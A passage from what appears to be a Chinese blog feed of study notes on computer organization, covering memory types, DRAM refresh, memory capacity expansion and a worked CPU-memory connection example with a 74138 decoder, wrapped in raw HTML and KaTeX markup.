class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p></li></ul><p>如果使用串行进位链，则需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>64</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">64t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">6</span><span class="mord">4</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></p><p>如果使用单重分组跳跃进位链，则需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">20t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>……</p><p>……</p><p>第三部分到此结束！敬请阅读第四部分🎆</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/118769966_p0.jpg" alt="118769966_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成指北 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
            <tag> 输入输出系统 </tag>
            
            <tag> 计算机运算方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成指北（二）</title>
      <link href="/posts/df375e9fefb4/"/>
      <url>/posts/df375e9fefb4/</url>
      
        <content type="html"><![CDATA[<h2 id="第四章-存储器"><a class="markdownIt-Anchor" href="#第四章-存储器"></a> 第四章 存储器</h2><blockquote><p>存储器存放了程序和数据存储程序的思想，使得计算机从专用走向通用。</p><p>存储器 ROM和RAM<br />存储器的图不要求画，但是需要知道特点，能看懂就行。需要了解刷新计算。<br /><strong>非常重要</strong>的是动态RAM和静态RAM的比较表<br /><strong>绝对会考</strong>存储器的电路图，而且占比分高，重中之重。参考教材PPT和作业<br />单体多体了解一下就行。<br />cache编码映射率概念肯定要会算的，都得背。知道地址编码后，给一种映射能不能算这种映射方式下主存如何编码。还要算利用率。</p></blockquote><p>前面我们提到了CPU通过总线与计算机的各个部件间进行通信，那么现在，我们就来学习占用计算机结构最大的部分：存储器。计算机大部分信息，都存储在存储器内。</p><p>按存取方式可分为两类存储器：随机存储器（RAM）和只读存储器（ROM）。前者在程序执行过程中可读可写，后者则只读。</p><p>按在计算机中的作用分类如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616195445786.png" alt="image-20240616195445786" style="zoom:50%;" /><p>主存储器：即内存，直接和CPU交互信息，速度快，容量小，价位高；对应内存条。</p><p>辅助存储器：即外存，存放暂时不用的程序和数据，速度慢，容量大，价位低；对应硬盘。</p><p>缓冲存储器：用在两种速度不同的部件中，即Cache，通过映射加快数据读取效率。</p><p>现在的计算机运用层次存储器系统，旨在实现：以最低的价格提供尽可能大的存储空间，以最快速的技术实现高速访问。于是选用生产与运行成本不同的、存储容量不同的、读写速度不同的多种存储介质，组成一个统一的存储器系统，使每种介质都处于不同的地位，发挥不同的作用，充分发挥各自在速度、容量、成本方面的优势，从而达到最优性能价格比，以满足使用要求。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617152036076.png" alt="image-20240617152036076" style="zoom:50%;" /><h3 id="随机存取存储器ram"><a class="markdownIt-Anchor" href="#随机存取存储器ram"></a> 随机存取存储器RAM</h3><h4 id="静态ramsram"><a class="markdownIt-Anchor" href="#静态ramsram"></a> 静态RAM（SRAM）</h4><ul><li>利用触发器工作原理存储信息</li><li>信息读出后，仍保持原状态</li><li>电源断电后，原存信息丢失</li><li>速度快、能耗高、存储密度低</li></ul><h4 id="动态ramdram"><a class="markdownIt-Anchor" href="#动态ramdram"></a> 动态RAM（DRAM）</h4><ul><li>利用电容存储电荷的原理来存储信息</li><li>即使电源不断电，信息也会自动消失</li><li>集成度高、容量大、功耗低、速度慢</li></ul><p>一般来说，DRAM组成内存条，而SRAM则充当内存条和主存之间的Cache。</p><p>因为动态RAM的信息容易丢失，所以需要刷新RAM以维持信息。刷新即对所有存储单元回复一次原状态的过程。先将原信息读出，再由刷新放大器形成原信息重新写入。刷新周期即对动态ROM的全部基本单元电路作一次刷新的时间。</p><p>刷新方法有三种：集中刷新、分散刷新和异步刷新</p><p>集中刷新是在规定的时间内，对全部存储单元集中一段时间进行逐行刷新，此时必须停止读写操作。这样做会出现“死区”。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616204944733.png" alt="image-20240616204944733" style="zoom:50%;" /><p>分散刷新时指对每个存储单元的刷新分散到每个存取周期完成，即把存储周期分为两段，前半段用来读写或维持信息，后半段用来刷新。这样做没有死区，且128us就可全部刷新一遍，但是存取周期变长了，整体系统变慢了。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616205127898.png" alt="image-20240616205127898" style="zoom:50%;" /><p>异步刷新则结合了分散刷新和集中刷新，将集中刷新分散到了2ms内。如果将刷新安排在指令译码阶段，将不会出现死区。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616210200154.png" alt="image-20240616210200154" style="zoom:50%;" /><h3 id="动态ram和静态ram的比较"><a class="markdownIt-Anchor" href="#动态ram和静态ram的比较"></a> 动态RAM和静态RAM的比较</h3><p>重点！需要加强记忆。</p><table><thead><tr><th></th><th>DRAM主存</th><th>SRAM缓存</th></tr></thead><tbody><tr><td>存储原理</td><td>电容</td><td>触发器</td></tr><tr><td>集成度</td><td>高</td><td>低</td></tr><tr><td>芯片引脚</td><td>少</td><td>多</td></tr><tr><td>功耗</td><td>小</td><td>大</td></tr><tr><td>价格</td><td>低</td><td>高</td></tr><tr><td>速度</td><td>慢</td><td>快</td></tr><tr><td>刷新</td><td>有</td><td>无</td></tr></tbody></table><h3 id="只读存储器rom"><a class="markdownIt-Anchor" href="#只读存储器rom"></a> 只读存储器ROM</h3><p>有掩膜ROM等。了解就好。</p><h3 id="存储器与cpu的连接"><a class="markdownIt-Anchor" href="#存储器与cpu的连接"></a> 存储器与CPU的连接</h3><p>这节是重点之一，其中会涉及到非常多的图像。</p><h4 id="存储器容量的扩展"><a class="markdownIt-Anchor" href="#存储器容量的扩展"></a> 存储器容量的扩展</h4><p>先从最基本的一步开始，了解如何扩大存储器的容量。</p><p>首先了解一个概念：如何表示存储芯片的容量？正如前面所介绍的，一个存储体能够存储多少容量取决于MAR和MDR的宽度。如果地址总线宽度为10，数据总线宽度为1，那么总容量就为：2<sup>10</sup>*1=1K。要拓展存储量，可以使用<strong>位扩展</strong>和<strong>字扩展</strong>两种方法。</p><h5 id="位扩充"><a class="markdownIt-Anchor" href="#位扩充"></a> 位扩充</h5><p>我们可以通过增加存储字长的方法来扩展存储容量。</p><p>同理，我们可以用2片1K×4位（10根地址线，4根数据线）的存储芯片组成1K×8位（10根地址线，8根数据线）的存储器。画图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616211043971.png" alt="image-20240616211043971" style="zoom:50%;" /><p>其中A<sub>0</sub>~A<sub>9</sub>是地址线，D<sub>0</sub>~D<sub>7</sub>是数据线；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>C</mi><mi>S</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{CS}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>是片选信号，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>W</mi><mi>E</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{WE}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>是写允许信号，两者低电平有效。画图的时候不必深究，只需要记得上面连地址线，下面连数据线，再依次从右边接上<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>C</mi><mi>S</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{CS}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>W</mi><mi>E</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{WE}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>就好。</p><h5 id="字拓展"><a class="markdownIt-Anchor" href="#字拓展"></a> 字拓展</h5><p>还可以通过增加存储字的数量来扩充内存。</p><p>用2片1K × 8位（10根地址线，8根数据线） 存储芯片组成 2K × 8位（11根地址线，8根数据线） 的存储器。画图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616211921979.png" alt="image-20240616211921979" style="zoom:50%;" /><p>与位扩展不同的是，除了地址线和数据线的数量，还有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>C</mi><mi>S</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{CS}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>片选信号的改变。这里把A<sub>10</sub>当做片选信号，并使用一个反相器来选择芯片。当A<sub>10</sub>分别为正负电平时，机器会选中左或右两块存储芯片，以达到扩展字长的目的。仅用一根片选信号线和反相器就替代了再额外添加地址线（还是多加了一根）。</p><h5 id="字位扩展"><a class="markdownIt-Anchor" href="#字位扩展"></a> 字位扩展</h5><p>结合上述两种方法，可以用8片 1K × 4位 存储芯片组成 4K × 8位 的存储器。</p><blockquote><p>计算小tip：在计算用几片已有芯片组成指定芯片存储器时，分别用地址线和数据线除以原地址线和数据线根数，再将得到的倍数相乘就好了。比如8片＝4K/1K×8位/4位</p></blockquote><p>结合上述两种方式的方法，可作图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616212735930.png" alt="image-20240616212735930" style="zoom:50%;" /><p>首先确定最后共有8位数据线，12根地址线；有4K/1K=4个芯片作为一组来进行字扩充，有8位/4位=2个芯片一组作为位扩充；再根据有4块作为字扩充的区域需要额外的2根地址线作为片选信号扩展（2根地址线能索引2<sup>2</sup>=4个区域），最终作图如上。</p><h5 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h5><p>总结扩充存储容量的画图方法：</p><ol><li>计算需要多少块芯片才能扩展成要求的芯片容量：直接用容量相除可得片数</li><li>计算最终需要多少根地址线、数据线以及作为片选信号的额外地址线：<ul><li>计算数据线：很简单，即扩充后位的数量</li><li>计算地址线：与原芯片的地址线相同，注意1K=10根地址线，1M=20根地址线</li><li>计算片选信号额外地址线：计算字扩充的倍数得到要选择的片数n，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi></mrow><annotation encoding="application/x-tex">log_2n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span></span></span></span>即可得到需要的额外地址线</li></ul></li><li>连接<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>W</mi><mi>E</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{WE}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>C</mi><mi>S</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{CS}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>。前者直接在数据线下补充，后者则经过一个反相器或者片选编码器。两者均连接在芯片的右侧。</li></ol><h4 id="存储器与-cpu-的连接"><a class="markdownIt-Anchor" href="#存储器与-cpu-的连接"></a> 存储器与 CPU 的连接</h4><p>在了解存储器如何扩展容量后，我们就得到了符合要求的存储器。接下来就需要把存储器连接到CPU，其中要点如下：</p><ol><li>地址线的连接</li><li>数据线的连接</li><li>读/写命令线的连接</li><li>片选线的连接</li><li>合理选择存储芯片</li><li>其他</li><li>时序、负载</li></ol><p>我们在设计CPU与存储器连接电路时，主要关注1~5点。即：地址线、数据线、读写命令线、片选线、芯片选择。</p><p>我们就直接从一道例题开始学习。</p><h5 id="例题一"><a class="markdownIt-Anchor" href="#例题一"></a> 例题一</h5><blockquote><p>设CPU有16根地址线，8根数据线</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>M</mi><mi>R</mi><mi>E</mi><mi>O</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{MREO}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>：访存控制信号</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>W</mi><mi>E</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{WE}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>:读/写控制信号</p><p>可使用芯片:<br />1K*4位RAM、4K*8位RAM、8K*8位RAM、2K*8位ROM、4K*8位ROM、8K*8位ROM</p><p>74138译码器</p><p>要求：</p><p>主存地址分配空间：</p><p>6000H~67FFH为系统存储区</p><p>6800H~6BFFH为用户程序</p></blockquote><p>要解答这道题我们要进行一下几个步骤：</p><ol><li>写出对应的二进制地址码</li><li>确定芯片的数量和类型</li><li>分配地址线</li><li>确定片选信号，画图</li></ol><p>首先我们先写二进制地址码，如图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617135802810.png" alt="image-20240617135802810" style="zoom:50%;" /><p>因为题给条件有16根地址线，所以我们列出A<sub>15</sub>~A<sub>0</sub>十六位，然后依次<strong>把地址范围用二进制表示</strong>。</p><p>比如系统存储区6000H~67FFH就是对应二进制数：</p><ul><li>0110 0000 0000 0000</li><li>0110 0111 1111 1111</li></ul><p>可以看到，16位地址线中只有11位是不同的，剩下5位自始至终都保持01100没有改变。也就是说，存储系统的存储器只需要11位的地址线足矣，对应2×2<sup>10</sup>=2K。而CPU有8根数据线，故存储系统的存储器容量应为<font color="red"><strong>2K×8位</strong></font>。</p><p>同理，用户存储区6800H~6BFFH对应二进制数：</p><ul><li>0110 1000 0000 0000</li><li>0110 1011 1111 1111</li></ul><p>只有10位发生了改变，也就是分配10根地址线。最终存储用户程序的存储器容量应为<font color="red"><strong>1K×8位</strong></font>。</p><p><strong>接着我们来确定芯片的类型与数量</strong>。系统存储器应该是可读存储器，故使用ROM芯片来作为存储器。只需要1片题给的2K×8位ROM就可以满足条件；而用户存储器应该储存在可读可写存储器中，于是我们选用2片题给的1K×4位RAM，通过位扩充即可满足要求。</p><p><strong>之后我们来分配地址线</strong>。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617141527051.png" alt="image-20240617141527051" style="zoom:50%;" /><p>可以看到，ROM和RAM分别分配了对应于它们地址线根数的地址线。其中，A<sub>11</sub>~A<sub>13</sub>被分配至A、B、C接口（稍后介绍74138译码器会提到）。A<sub>14</sub>~A<sub>15</sub>则和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>M</mi><mi>R</mi><mi>E</mi><mi>O</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{MREO}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>（访存信号，低电平有效）被用来作为片选信号。</p><p>关于74138译码器，可以参考下图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617141942379.png" alt="image-20240617141942379" style="zoom:50%;" /><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>1</mn></msub><mo separator="true">,</mo><mover accent="true"><msub><mi>G</mi><mrow><mn>2</mn><mi>A</mi></mrow></msub><mo stretchy="true">‾</mo></mover><mo separator="true">,</mo><mover accent="true"><msub><mi>G</mi><mrow><mn>2</mn><mi>B</mi></mrow></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">G_1,\overline{G_{2A}},\overline{G_{2B}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>是控制端，只有三接口均有效才能使译码器正常工作（注意后两者是低电平有效，即需要保证第一个接口为高电平，后两个接口为低电平才能正常工作）；A、B、C是功能端，用来输入二进制数；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>Y</mi><mn>0</mn></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{Y_0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.03333em;vertical-align:-0.15em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>等端口则是十进制输出端，对应功能端输入的二进制数，同样是低电平有效。</p><p>最后，我们确定片选信号，并画出CPU与存储器的连接图。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617142423776.png" alt="image-20240617142423776" style="zoom:50%;" 